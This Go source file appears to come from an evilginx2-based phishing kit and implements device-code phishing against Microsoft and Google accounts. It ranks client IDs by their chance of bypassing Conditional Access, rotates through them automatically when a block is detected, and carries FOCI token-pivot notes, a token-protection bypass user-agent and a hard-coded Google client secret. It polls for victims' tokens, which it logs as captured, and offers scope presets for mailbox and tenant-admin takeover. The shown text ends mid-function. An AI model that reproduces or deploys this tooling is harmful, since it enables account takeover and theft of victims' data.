package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// Provider constants
const (
	DCProviderMicrosoft = "microsoft"
	DCProviderGoogle    = "google"
)

// Valid providers
var ValidDCProviders = []string{DCProviderMicrosoft, DCProviderGoogle}

// Microsoft OAuth 2.0 endpoints
const (
	MS_DEVICE_CODE_URL = "https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode"
	MS_TOKEN_URL       = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"
	MS_GRAPH_ME_URL    = "https://graph.microsoft.com/v1.0/me"
)

// Google OAuth 2.0 endpoints
const (
	GOOGLE_DEVICE_CODE_URL = "https://oauth2.googleapis.com/device/code"
	GOOGLE_TOKEN_URL       = "https://oauth2.googleapis.com/token"
	GOOGLE_USERINFO_URL    = "https://www.googleapis.com/oauth2/v3/userinfo"
	GOOGLE_VERIFY_URL      = "https://www.google.com/device"
)

// Device code session states
const (
	DCStatePending   = "pending"   // Device code generation in progress (async)
	DCStateWaiting   = "waiting"   // Waiting for user to authorize
	DCStateCaptured  = "captured"  // Tokens captured successfully
	DCStateExpired   = "expired"   // Device code expired
	DCStateFailed    = "failed"    // Failed with error
	DCStateCancelled = "cancelled" // Cancelled by operator
)

// Known Microsoft OAuth client IDs (first-party apps)
// NOTE: Some client IDs bypass Conditional Access policies more easily than others.
// The CAP bypass rating indicates likelihood of bypassing device compliance requirements:
//   [HIGH]   - Often whitelisted, used for device enrollment/management
//   [MEDIUM] - Standard first-party apps, may be blocked by strict CAP
//   [LOW]    - Well-known, often explicitly blocked
var KnownClientIDs = map[string]struct {
	ClientID string
	Name     string
	Provider string
}{
	// ==================== CAP BYPASS CANDIDATES [HIGH] ====================
	// These clients are involved in device registration/management and are often
	// whitelisted even in strict Conditional Access environments

	// Microsoft Authentication Broker - handles device registration on Windows
	// Often whitelisted because blocking it breaks Windows device enrollment
	"ms_auth_broker": {ClientID: "29d9ed98-a469-4536-ade2-f981bc1d605e", Name: "Microsoft Authentication Broker", Provider: DCProviderMicrosoft},

	// Windows Cloud Experience Host - device OOBE and enrollment
	// Used during Windows device setup, often exempt from device compliance (circular dependency)
	"ms_cxh_host": {ClientID: "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9", Name: "Windows Cloud Experience Host", Provider: DCProviderMicrosoft},

	// Microsoft Intune Company Portal - device enrollment app
	// Whitelisted in most tenants because it's required TO BECOME compliant
	"ms_intune_portal": {ClientID: "d4244571-73c4-45f0-abf3-17c00ec37858", Name: "Microsoft Intune Company Portal", Provider: DCProviderMicrosoft},

	// Windows Azure Active Directory - WAM broker
	// Core Windows identity component, often implicitly trusted
	"ms_wam": {ClientID: "1b730954-1685-4b74-9bfd-dac224a7b894", Name: "Windows Azure AD", Provider: DCProviderMicrosoft},

	// Microsoft Intune Enrollment - device enrollment service
	"ms_intune_enroll": {ClientID: "0000000a-0000-0000-c000-000000000000", Name: "Microsoft Intune Enrollment", Provider: DCProviderMicrosoft},

	// Azure AD Registered Device - PRT bootstrap client
	"ms_aad_reg": {ClientID: "dd762716-544d-4aeb-a526-687b73838a22", Name: "Azure AD Registered Device", Provider: DCProviderMicrosoft},

	// Microsoft Account (MSA) broker for consumer accounts
	"ms_msa": {ClientID: "f3d6d1d3-d6a6-47ac-ab10-4a8bb6c6e5b8", Name: "Microsoft Account", Provider: DCProviderMicrosoft},

	// ==================== STANDARD CLIENTS [MEDIUM] ====================
	// Standard Microsoft apps, subject to normal CAP evaluation

	"ms_office":      {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Office", Provider: DCProviderMicrosoft},
	"ms_teams":       {ClientID: "1fec8e78-bce4-4aaf-ab1b-5451cc387264", Name: "Microsoft Teams", Provider: DCProviderMicrosoft},
	"azure_cli":      {ClientID: "04b07795-8ddb-461a-bbee-02f9e1bf7b46", Name: "Azure CLI", Provider: DCProviderMicrosoft},
	"ms_outlook":     {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Outlook", Provider: DCProviderMicrosoft},
	"ms_graph":       {ClientID: "14d82eec-204b-4c2f-b7e8-296a70dab67e", Name: "Microsoft Graph PowerShell", Provider: DCProviderMicrosoft},
	"ms_intune":      {ClientID: "d4244571-73c4-45f0-abf3-17c00ec37858", Name: "Microsoft Intune Portal", Provider: DCProviderMicrosoft},
	"ms_onedrive":    {ClientID: "b26aadf8-566f-4478-926f-589f601d9c74", Name: "Microsoft OneDrive", Provider: DCProviderMicrosoft},
	"ms_sharepoint":  {ClientID: "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", Name: "Microsoft SharePoint", Provider: DCProviderMicrosoft},
	"ms_authenticator": {ClientID: "4813382a-8fa7-425e-ab75-3b753aab3abb", Name: "Microsoft Authenticator", Provider: DCProviderMicrosoft},

	// Microsoft 365 unified app (newer, may have better CAP treatment)
	"ms_365":         {ClientID: "00b41c95-dab0-4487-9791-b9d2c32c80f2", Name: "Microsoft 365", Provider: DCProviderMicrosoft},

	// Microsoft Edge - browser with native Entra ID integration
	"ms_edge":        {ClientID: "ecd6b820-32c2-49b6-98a6-444530e5a77a", Name: "Microsoft Edge", Provider: DCProviderMicrosoft},

	// Azure PowerShell - admin tool often whitelisted for ops
	"azure_ps":       {ClientID: "1950a258-227b-4e31-a9cf-717495945fc2", Name: "Azure PowerShell", Provider: DCProviderMicrosoft},

	// Visual Studio - developer tool often whitelisted
	"ms_vs":          {ClientID: "872cd9fa-d31f-45e0-9eab-6e460a02d1f1", Name: "Visual Studio", Provider: DCProviderMicrosoft},

	// Office Hub (FOCI member, can exchange tokens with other FOCI clients)
	"ms_office_hub":  {ClientID: "4765445b-32c6-49b0-83e6-1d93765276ca", Name: "Microsoft Office Hub", Provider: DCProviderMicrosoft},

	// ==================== GOOGLE CLIENTS ====================
	"google_cloud_sdk":     {ClientID: "32555940559.apps.googleusercontent.com", Name: "Google Cloud SDK", Provider: DCProviderGoogle},
	"google_tv":            {ClientID: "300553494095-k0t2me0njk63h2t66mfcl97dpjfomf2p.apps.googleusercontent.com", Name: "Google TV", Provider: DCProviderGoogle},
	"google_device_policy": {ClientID: "607806427481-viqkf4mf7f7oedu95uh6urp1k2knguib.apps.googleusercontent.com", Name: "Google Device Policy", Provider: DCProviderGoogle},
	"google_chrome_sync":   {ClientID: "77185425430.apps.googleusercontent.com", Name: "Google Chrome Sync", Provider: DCProviderGoogle},
	"google_ios":           {ClientID: "49625052041-g2ai52selqdp6bkvb5bki7bk3ns2mrn2.apps.googleusercontent.com", Name: "Google iOS", Provider: DCProviderGoogle},
}

// FOCIClients lists client IDs that belong to Microsoft's "Family of Client IDs" (FOCI)
// FOCI clients share refresh tokens! If you get a token from one, you can exchange to another.
// This allows pivoting to a different client that might not be blocked by CAP.
var FOCIClients = []string{
	"d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
	"1fec8e78-bce4-4aaf-ab1b-5451cc387264", // Microsoft Teams
	"00b41c95-dab0-4487-9791-b9d2c32c80f2", // Microsoft 365
	"4765445b-32c6-49b0-83e6-1d93765276ca", // Microsoft Office Hub
	"d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", // SharePoint
	"27922004-5251-4030-b22d-91ecd9a37ea4", // Outlook Mobile
	"ab9b8c07-8f02-4f72-87fa-80105867a763", // OneDrive iOS
	"b26aadf8-566f-4478-926f-589f601d9c74", // OneDrive
	"2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", // Microsoft Bing Search
	"844cca35-0656-46ce-b636-13f48b0eecbd", // Microsoft To-Do
}

// CAPBypassClients is the ordered list of client aliases to try for Conditional Access bypass.
// These are sorted by probability of bypassing strict CAP policies (highest first).
// The system will automatically cycle through these when CAP blocks are detected.
var CAPBypassClients = []string{
	"ms_cxh_host",      // Windows Cloud Experience Host - OOBE, often exempt from device compliance
	"ms_auth_broker",   // Microsoft Authentication Broker - device registration, usually whitelisted
	"ms_intune_portal", // Intune Company Portal - required TO BECOME compliant (circular dependency)
	"ms_wam",           // Windows Azure AD broker - core Windows identity component
	"ms_intune_enroll", // Intune enrollment service
	"ms_aad_reg",       // Azure AD Registered Device - PRT bootstrap
	"azure_cli",        // Azure CLI - admin tool often whitelisted by IT
	"ms_365",           // Microsoft 365 unified app (newer, may have better treatment)
	"azure_ps",         // Azure PowerShell - admin tool
	"ms_vs",            // Visual Studio - developer tool often whitelisted
	"ms_edge",          // Microsoft Edge with native Entra ID
	"ms_office_hub",    // Office Hub (FOCI member)
	"ms_teams",         // Teams (FOCI member)
	"ms_office",        // Standard Office (last resort)
}

// CAPErrorPatterns contains error strings that indicate a Conditional Access Policy block
var CAPErrorPatterns = []string{
	"AADSTS53000", // Device compliance required
	"AADSTS53001", // Device not compliant
	"AADSTS53002", // Device needs to be managed
	"AADSTS53003", // Access blocked by Conditional Access
	"AADSTS53004", // ProofUp required (MFA enrollment)
	"AADSTS50076", // MFA required
	"AADSTS50079", // MFA enrollment required
	"AADSTS50105", // Admin has not authorized user
	"AADSTS50126", // Invalid credentials (may be CAP-related)
	"AADSTS50158", // External security challenge required
	"AADSTS65001", // User hasn't consented to app (may need admin consent)
	"AADSTS70011", // Invalid scope
	"AADSTS700016", // App not found in tenant
	"does not meet the criteria",
	"access to this resource",
	"Conditional Access",
	"device compliance",
	"sign-in was successful but",
	"restricted by your admin",
}

// IsCAPError checks if an error message indicates a Conditional Access block
func IsCAPError(errMsg string) bool {
	errLower := strings.ToLower(errMsg)
	for _, pattern := range CAPErrorPatterns {
		if strings.Contains(errLower, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

// GoogleClientSecrets stores client_secret for Google OAuth clients that require it
// Google device code flow requires client_secret (unlike Microsoft which uses public clients)
var GoogleClientSecrets = map[string]string{
	"google_cloud_sdk": "ZmssLNjJy2998hD4CTg2ejr2",
	"google_tv":        "",
}

// Default scope presets (Microsoft)
var ScopePresets = map[string]string{
	// Microsoft scopes
	"full":      "https://graph.microsoft.com/.default offline_access",
	"mail":      "Mail.Read Mail.ReadWrite Mail.Send offline_access",
	"files":     "Files.Read.All Files.ReadWrite.All offline_access",
	"user":      "User.Read User.ReadBasic.All offline_access",
	"directory": "Directory.Read.All offline_access",
	"teams":     "ChannelMessage.Read.All Chat.Read Chat.ReadWrite offline_access",
	"minimal":   "openid profile email offline_access",
	// Admin scopes - full tenant control (use azure_cli or ms_graph client)
	"admin":     "https://graph.microsoft.com/.default offline_access",
	"admin_mail": "Mail.ReadWrite Mail.Send Mail.Read.Shared User.Read.All Directory.Read.All offline_access",
	"admin_full": "Directory.ReadWrite.All User.ReadWrite.All Mail.ReadWrite RoleManagement.ReadWrite.Directory Application.ReadWrite.All Sites.FullControl.All Files.ReadWrite.All offline_access",
	// Google scopes
	"gmail":      "https://mail.google.com/ openid email profile",
	"gdrive":     "https://www.googleapis.com/auth/drive openid email profile",
	"gworkspace": "https://mail.google.com/ https://www.googleapis.com/auth/drive https://www.googleapis.com/auth/calendar https://www.googleapis.com/auth/contacts openid email profile",
	"gcalendar":  "https://www.googleapis.com/auth/calendar openid email profile",
	"gcontacts":  "https://www.googleapis.com/auth/contacts openid email profile",
	"gcloud":     "https://www.googleapis.com/auth/cloud-platform openid email profile",
	"gprofile":   "openid email profile",
	"gadmin":     "https://www.googleapis.com/auth/admin.directory.user openid email profile",
	"gall":       "https://mail.google.com/ https://www.googleapis.com/auth/drive https://www.googleapis.com/auth/calendar https://www.googleapis.com/auth/contacts https://www.googleapis.com/auth/cloud-platform openid email profile",
}

// OS/2 Warp User-Agent for token protection bypass (Microsoft-specific)
const OS2_WARP_UA = "Mozilla/4.0 (compatible; MSIE 5.5; OS/2 Warp 4)"

// IsValidDCProvider checks if a provider string is valid
func IsValidDCProvider(provider string) bool {
	for _, p := range ValidDCProviders {
		if p == provider {
			return true
		}
	}
	return false
}

// GetProviderForClient returns the provider for a given client alias
func GetProviderForClient(clientAlias string) string {
	if c, ok := KnownClientIDs[clientAlias]; ok {
		return c.Provider
	}
	return DCProviderMicrosoft // default
}

// GetClientsForProvider returns all client aliases for a given provider
func GetClientsForProvider(provider string) []string {
	var clients []string
	for k, v := range KnownClientIDs {
		if v.Provider == provider {
			clients = append(clients, k)
		}
	}
	return clients
}

// GetScopesForProvider returns scope presets appropriate for a provider
func GetScopesForProvider(provider string) []string {
	var scopes []string
	for k := range ScopePresets {
		switch provider {
		case DCProviderGoogle:
			if strings.HasPrefix(k, "g") || k == "minimal" {
				scopes = append(scopes, k)
			}
		case DCProviderMicrosoft:
			if !strings.HasPrefix(k, "g") || k == "minimal" {
				scopes = append(scopes, k)
			}
		default:
			scopes = append(scopes, k)
		}
	}
	return scopes
}

// DeviceCodeResponse from device code endpoint (works for both Microsoft and Google)
type DeviceCodeResponse struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationURI string `json:"verification_uri"`
	VerificationURL string `json:"verification_url"` // Google uses this field name
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
	Message         string `json:"message"`
}

// TokenResponse from Microsoft's token endpoint
type TokenResponse struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
}

// TokenErrorResponse when polling returns an error
type TokenErrorResponse struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
}

// MSGraphUser from Microsoft Graph /me endpoint
type MSGraphUser struct {
	DisplayName       string `json:"displayName"`
	GivenName         string `json:"givenName"`
	Surname           string `json:"surname"`
	Mail              string `json:"mail"`
	UserPrincipalName string `json:"userPrincipalName"`
	ID                string `json:"id"`
	JobTitle          string `json:"jobTitle"`
	OfficeLocation    string `json:"officeLocation"`
	MobilePhone       string `json:"mobilePhone"`
}

// DeviceCodeSession tracks a single device code flow
type DeviceCodeSession struct {
	ID            string            `json:"id"`
	Provider      string            `json:"provider"` // "microsoft" or "google"
	ClientName    string            `json:"client_name"`
	ClientID      string            `json:"client_id"`
	ClientSecret  string            `json:"-"` // Google requires client_secret
	Scope         string            `json:"scope"`
	Tenant        string            `json:"tenant"`
	DeviceCode    string            `json:"device_code"`
	UserCode      string            `json:"user_code"`
	VerifyURL     string            `json:"verify_url"`
	ExpiresAt     time.Time         `json:"expires_at"`
	Interval      int               `json:"interval"`
	State         string            `json:"state"`
	AccessToken   string            `json:"access_token,omitempty"`
	RefreshToken  string            `json:"refresh_token,omitempty"`
	IDToken       string            `json:"id_token,omitempty"`
	TokenScope    string            `json:"token_scope,omitempty"`
	TokenExpiry   time.Time         `json:"token_expiry,omitempty"`
	Error         string            `json:"error,omitempty"`
	CreatedAt     time.Time         `json:"created_at"`
	CapturedAt    time.Time         `json:"captured_at,omitempty"`
	UserInfo      *MSGraphUser      `json:"user_info,omitempty"`
	GoogleUser    *GoogleUserInfo   `json:"google_user,omitempty"`
	LinkedSession string            `json:"linked_session,omitempty"` // Linked AitM session ID
	Metadata      map[string]string `json:"metadata,omitempty"`
	// CAP Bypass fields
	CAPBypassMode      bool     `json:"cap_bypass_mode"`       // Whether auto-CAP-bypass is enabled
	CAPBypassIndex     int      `json:"cap_bypass_index"`      // Current position in CAPBypassClients
	CAPBypassAttempted []string `json:"cap_bypass_attempted"`  // Clients that have been tried
	CAPBypassSuccess   string   `json:"cap_bypass_success"`    // Client that successfully bypassed CAP
	pollCancel         chan struct{}
	mu                 sync.Mutex
}

// GoogleUserInfo from Google's userinfo endpoint
type GoogleUserInfo struct {
	Sub           string `json:"sub"`
	Name          string `json:"name"`
	GivenName     string `json:"given_name"`
	FamilyName    string `json:"family_name"`
	Picture       string `json:"picture"`
	Email         string `json:"email"`
	EmailVerified bool   `json:"email_verified"`
	Locale        string `json:"locale"`
	HD            string `json:"hd"` // Hosted domain (Google Workspace)
}

// DeviceCodeManager manages all device code sessions
type DeviceCodeManager struct {
	sessions  map[string]*DeviceCodeSession
	tenant    string
	mu        sync.RWMutex
	onCapture func(session *DeviceCodeSession) // Callback when tokens are captured
}

// NewDeviceCodeManager creates a new manager
func NewDeviceCodeManager() *DeviceCodeManager {
	return &DeviceCodeManager{
		sessions: make(map[string]*DeviceCodeSession),
		tenant:   "common",
	}
}

// SetTenant sets the default tenant
func (m *DeviceCodeManager) SetTenant(tenant string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.tenant = tenant
}

// GetTenant returns the current tenant
func (m *DeviceCodeManager) GetTenant() string {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.tenant
}

// SetOnCapture sets the callback for token capture events
func (m *DeviceCodeManager) SetOnCapture(fn func(session *DeviceCodeSession)) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.onCapture = fn
}

// RequestDeviceCode initiates a new device code flow (auto-detects provider from client alias)
// Special aliases:
//   - "cap_bypass" or "bypass": Automatically cycles through CAP bypass clients on failure
func (m *DeviceCodeManager) RequestDeviceCode(clientAlias string, scopePreset string) (*DeviceCodeSession, error) {
	// Handle special CAP bypass mode
	if clientAlias == "cap_bypass" || clientAlias == "bypass" {
		return m.RequestDeviceCodeWithCAPBypass(scopePreset)
	}

	// Resolve client ID
	client, ok := KnownClientIDs[clientAlias]
	if !ok {
		return nil, fmt.Errorf("unknown client: %s (available: %s, cap_bypass)", clientAlias, m.GetClientNames())
	}

	// Resolve scope
	scope, ok := ScopePresets[scopePreset]
	if !ok {
		// Allow raw scope string
		scope = scopePreset
	}

	provider := client.Provider
	clientSecret := ""
	if provider == DCProviderGoogle {
		if s, ok := GoogleClientSecrets[clientAlias]; ok {
			clientSecret = s
		}
	}

	return m.requestDeviceCodeInternal(provider, client.ClientID, client.Name, clientSecret, scope)
}

// RequestDeviceCodeWithClientID initiates a device code flow with a raw client ID
func (m *DeviceCodeManager) RequestDeviceCodeWithClientID(provider string, clientID string, clientName string, clientSecret string, scope string) (*DeviceCodeSession, error) {
	if provider == "" {
		provider = DCProviderMicrosoft
	}
	return m.requestDeviceCodeInternal(provider, clientID, clientName, clientSecret, scope)
}

// requestDeviceCodeInternal handles the actual device code request for any provider
func (m *DeviceCodeManager) requestDeviceCodeInternal(provider string, clientID string, clientName string, clientSecret string, scope string) (*DeviceCodeSession, error) {
	tenant := m.GetTenant()

	var deviceCodeURL string
	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("scope", scope)

	switch provider {
	case DCProviderGoogle:
		deviceCodeURL = GOOGLE_DEVICE_CODE_URL
		if clientSecret != "" {
			data.Set("client_secret", clientSecret)
		}
	case DCProviderMicrosoft:
		deviceCodeURL = fmt.Sprintf(MS_DEVICE_CODE_URL, tenant)
	default:
		return nil, fmt.Errorf("unsupported provider: %s (supported: microsoft, google)", provider)
	}

	httpClient := GetHttpClient()
	resp, err := httpClient.PostForm(deviceCodeURL, data)
	if err != nil {
		return nil, fmt.Errorf("failed to request device code: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenErrorResponse
		json.Unmarshal(body, &errResp)
		return nil, fmt.Errorf("device code request failed (%d): %s - %s", resp.StatusCode, errResp.Error, errResp.ErrorDescription)
	}

	var dcResp DeviceCodeResponse
	if err := json.Unmarshal(body, &dcResp); err != nil {
		return nil, fmt.Errorf("failed to parse response: %v", err)
	}

	// Google uses "verification_url" field; Microsoft uses "verification_uri"
	verifyURL := dcResp.VerificationURI
	if verifyURL == "" {
		verifyURL = dcResp.VerificationURL
	}
	if verifyURL == "" && provider == DCProviderGoogle {
		verifyURL = GOOGLE_VERIFY_URL
	}

	sessionID := GenRandomAlphanumString(8)
	session := &DeviceCodeSession{
		ID:           sessionID,
		Provider:     provider,
		ClientName:   clientName,
		ClientID:     clientID,
		ClientSecret: clientSecret,
		Scope:        scope,
		Tenant:       tenant,
		DeviceCode:   dcResp.DeviceCode,
		UserCode:     dcResp.UserCode,
		VerifyURL:    verifyURL,
		ExpiresAt:    time.Now().Add(time.Duration(dcResp.ExpiresIn) * time.Second),
		Interval:     dcResp.Interval,
		State:        DCStateWaiting,
		CreatedAt:    time.Now(),
		Metadata:     make(map[string]string),
		pollCancel:   make(chan struct{}),
	}

	if session.Interval < 5 {
		session.Interval = 5
	}

	m.mu.Lock()
	m.sessions[sessionID] = session
	m.mu.Unlock()

	return session, nil
}

// ============================================================================
// CAP BYPASS AUTO-ROTATION
// ============================================================================
// These functions automatically cycle through multiple client IDs when
// Conditional Access policies block access. The system tries each client
// in CAPBypassClients order until one succeeds.

// RequestDeviceCodeWithCAPBypass initiates a device code with CAP bypass enabled.
// It starts with the first client in CAPBypassClients and will automatically
// rotate to the next client if a CAP block is detected during polling.
func (m *DeviceCodeManager) RequestDeviceCodeWithCAPBypass(scopePreset string) (*DeviceCodeSession, error) {
	if len(CAPBypassClients) == 0 {
		return nil, fmt.Errorf("no CAP bypass clients configured")
	}

	// Start with the first bypass client
	firstClientAlias := CAPBypassClients[0]
	client, ok := KnownClientIDs[firstClientAlias]
	if !ok {
		return nil, fmt.Errorf("first bypass client %s not found in KnownClientIDs", firstClientAlias)
	}

	// Resolve scope
	scope, ok := ScopePresets[scopePreset]
	if !ok {
		scope = scopePreset
	}

	log.Info("[devicecode] Starting CAP bypass mode with %d clients to try", len(CAPBypassClients))
	log.Info("[devicecode] Client rotation order: %s", strings.Join(CAPBypassClients, " -> "))
	log.Info("[devicecode] Trying client 1/%d: %s", len(CAPBypassClients), client.Name)

	session, err := m.requestDeviceCodeInternal(client.Provider, client.ClientID, client.Name, "", scope)
	if err != nil {
		return nil, err
	}

	// Enable CAP bypass mode on the session
	session.mu.Lock()
	session.CAPBypassMode = true
	session.CAPBypassIndex = 0
	session.CAPBypassAttempted = []string{firstClientAlias}
	session.Scope = scope // Store original scope for rotation
	session.mu.Unlock()

	return session, nil
}

// rotateCAPBypassClient moves to the next CAP bypass client after a CAP error.
// Returns true if a new client was started, false if all clients exhausted.
func (m *DeviceCodeManager) rotateCAPBypassClient(session *DeviceCodeSession) bool {
	session.mu.Lock()
	currentIndex := session.CAPBypassIndex
	scope := session.Scope
	session.mu.Unlock()

	nextIndex := currentIndex + 1
	if nextIndex >= len(CAPBypassClients) {
		log.Error("[devicecode] [%s] All %d CAP bypass clients exhausted - no bypass found", session.ID, len(CAPBypassClients))
		session.mu.Lock()
		session.State = DCStateFailed
		session.Error = "All CAP bypass clients exhausted - tenant has strict Conditional Access"
		session.mu.Unlock()
		return false
	}

	nextClientAlias := CAPBypassClients[nextIndex]
	client, ok := KnownClientIDs[nextClientAlias]
	if !ok {
		log.Error("[devicecode] [%s] Bypass client %s not found", session.ID, nextClientAlias)
		return m.rotateCAPBypassClient(session) // Skip and try next
	}

	log.Warning("[devicecode] [%s] CAP block detected! Rotating to client %d/%d: %s",
		session.ID, nextIndex+1, len(CAPBypassClients), client.Name)

	// Request new device code with next client (reuse same session ID structure)
	tenant := m.GetTenant()
	deviceCodeURL := fmt.Sprintf(MS_DEVICE_CODE_URL, tenant)

	data := url.Values{}
	data.Set("client_id", client.ClientID)
	data.Set("scope", scope)

	httpClient := GetHttpClient()
	resp, err := httpClient.PostForm(deviceCodeURL, data)
	if err != nil {
		log.Error("[devicecode] [%s] Failed to request new device code: %v", session.ID, err)
		session.mu.Lock()
		session.CAPBypassIndex = nextIndex
		session.CAPBypassAttempted = append(session.CAPBypassAttempted, nextClientAlias)
		session.mu.Unlock()
		return m.rotateCAPBypassClient(session) // Try next
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Error("[devicecode] [%s] Failed to read response: %v", session.ID, err)
		return false
	}

	if resp.StatusCode != 200 {
		var errResp TokenErrorResponse
		json.Unmarshal(body, &errResp)
		log.Error("[devicecode] [%s] Device code request failed: %s", session.ID, errResp.ErrorDescription)
		session.mu.Lock()
		session.CAPBypassIndex = nextIndex
		session.CAPBypassAttempted = append(session.CAPBypassAttempted, nextClientAlias)
		session.mu.Unlock()
		return m.rotateCAPBypassClient(session) // Try next
	}

	var dcResp DeviceCodeResponse
	if err := json.Unmarshal(body, &dcResp); err != nil {
		log.Error("[devicecode] [%s] Failed to parse response: %v", session.ID, err)
		return false
	}

	// Update session with new device code (IMPORTANT: new user code!)
	session.mu.Lock()
	session.ClientID = client.ClientID
	session.ClientName = client.Name
	session.DeviceCode = dcResp.DeviceCode
	session.UserCode = dcResp.UserCode
	session.ExpiresAt = time.Now().Add(time.Duration(dcResp.ExpiresIn) * time.Second)
	session.Interval = dcResp.Interval
	session.CAPBypassIndex = nextIndex
	session.CAPBypassAttempted = append(session.CAPBypassAttempted, nextClientAlias)
	if session.Interval < 5 {
		session.Interval = 5
	}
	session.mu.Unlock()

	log.Success("[devicecode] [%s] New device code generated: %s (client: %s)",
		session.ID, dcResp.UserCode, client.Name)
	log.Info("[devicecode] [%s] User must enter NEW code: %s at microsoft.com/devicelogin",
		session.ID, dcResp.UserCode)

	return true
}

// StartPolling begins background polling for token capture
func (m *DeviceCodeManager) StartPolling(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	go m.pollForToken(session)
	return nil
}

// pollForToken continuously polls the token endpoint (provider-aware)
func (m *DeviceCodeManager) pollForToken(session *DeviceCodeSession) {
	var tokenURL string
	switch session.Provider {
	case DCProviderGoogle:
		tokenURL = GOOGLE_TOKEN_URL
	default:
		tokenURL = fmt.Sprintf(MS_TOKEN_URL, session.Tenant)
	}

	ticker := time.NewTicker(time.Duration(session.Interval) * time.Second)
	defer ticker.Stop()

	log.Info("[devicecode] [%s] polling started (provider: %s, code: %s, client: %s)", session.ID, session.Provider, session.UserCode, session.ClientName)

	for {
		select {
		case <-session.pollCancel:
			session.mu.Lock()
			session.State = DCStateCancelled
			session.mu.Unlock()
			log.Info("[devicecode] [%s] polling cancelled", session.ID)
			return

		case <-ticker.C:
			if time.Now().After(session.ExpiresAt) {
				session.mu.Lock()
				session.State = DCStateExpired
				session.mu.Unlock()
				log.Warning("[devicecode] [%s] device code expired", session.ID)
				return
			}

			data := url.Values{}
			data.Set("client_id", session.ClientID)
			data.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
			data.Set("device_code", session.DeviceCode)

			// Google requires client_secret in token requests
			if session.Provider == DCProviderGoogle && session.ClientSecret != "" {
				data.Set("client_secret", session.ClientSecret)
			}

			httpClient := GetHttpClient()
			resp, err := httpClient.PostForm(tokenURL, data)
			if err != nil {
				log.Debug("[devicecode] [%s] poll error: %v", session.ID, err)
				continue
			}

			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				var tokenResp TokenResponse
				if err := json.Unmarshal(body, &tokenResp); err != nil {
					log.Error("[devicecode] [%s] failed to parse token: %v", session.ID, err)
					continue
				}

				session.mu.Lock()
				session.State = DCStateCaptured
				session.AccessToken = tokenResp.AccessToken
				session.RefreshToken = tokenResp.RefreshToken
				session.IDToken = tokenResp.IDToken
				session.TokenScope = sanitizeRefreshScope(tokenResp.Scope)
				session.TokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn) * time.Second)
				session.CapturedAt = time.Now()
				session.mu.Unlock()

				log.Success("[devicecode] [%s] *** TOKENS CAPTURED *** (client: %s)", session.ID, session.ClientName)

				// Fetch user info BEFORE triggering callback (so email is available for notifications)
				m.fetchUserInfo(session)

				// Fire capture callback
				m.mu.RLock()
				cb := m.onCapture
				m.mu.RUnlock()
				if cb != nil {
					go cb(session)
				}

				return
			}

			// Handle polling errors
			var errResp TokenErrorResponse
			json.Unmarshal(body, &errResp)

			switch errResp.Error {
			case "authorization_pending":
				// Still waiting — this is normal
				continue
			case "slow_down":
				// Back off
				session.mu.Lock()
				session.Interval += 5
				session.mu.Unlock()
				ticker.Reset(time.Duration(session.Interval) * time.Second)
				log.Debug("[devicecode] [%s] slowing down, interval: %ds", session.ID, session.Interval)
			case "authorization_declined":
				session.mu.Lock()
				session.State = DCStateFailed
				session.Error = "User declined authorization"
				session.mu.Unlock()
				log.Warning("[devicecode] [%s] user declined authorization", session.ID)
				return
			case "expired_token":
				session.mu.Lock()
				session.State = DCStateExpired
				session.mu.Unlock()
				log.Warning("[devicecode] [%s] device code expired", session.ID)
				return
			case "access_denied", "interaction_required":
				// Check for CAP (Conditional Access Policy) error and auto-rotate client
				if session.CAPBypassMode && IsCAPError(errResp.ErrorDescription) {
					log.Warning("[devicecode] [%s] CAP BLOCK DETECTED (client: %s): %s", session.ID, session.ClientName, errResp.ErrorDescription)
					
					if m.rotateCAPBypassClient(session) {
						log.Info("[devicecode] [%s] Rotated to bypass client %d/%d: %s - NEW CODE: %s", 
							session.ID, session.CAPBypassIndex+1, len(CAPBypassClients), session.ClientName, session.UserCode)
						ticker.Reset(time.Duration(session.Interval) * time.Second)
						continue
					}
					// All bypass clients exhausted
					session.mu.Lock()
					session.State = DCStateFailed
					session.Error = fmt.Sprintf("CAP bypass failed - all %d clients blocked: %s", len(CAPBypassClients), errResp.ErrorDescription)
					session.mu.Unlock()
					log.Error("[devicecode] [%s] CAP bypass EXHAUSTED - all %d clients blocked", session.ID, len(CAPBypassClients))
					return
				}
				// Not in bypass mode or not a CAP error - fail normally
				session.mu.Lock()
				session.State = DCStateFailed
				session.Error = errResp.ErrorDescription
				session.mu.Unlock()
				log.Error("[devicecode] [%s] access denied: %s", session.ID, errResp.ErrorDescription)
				return
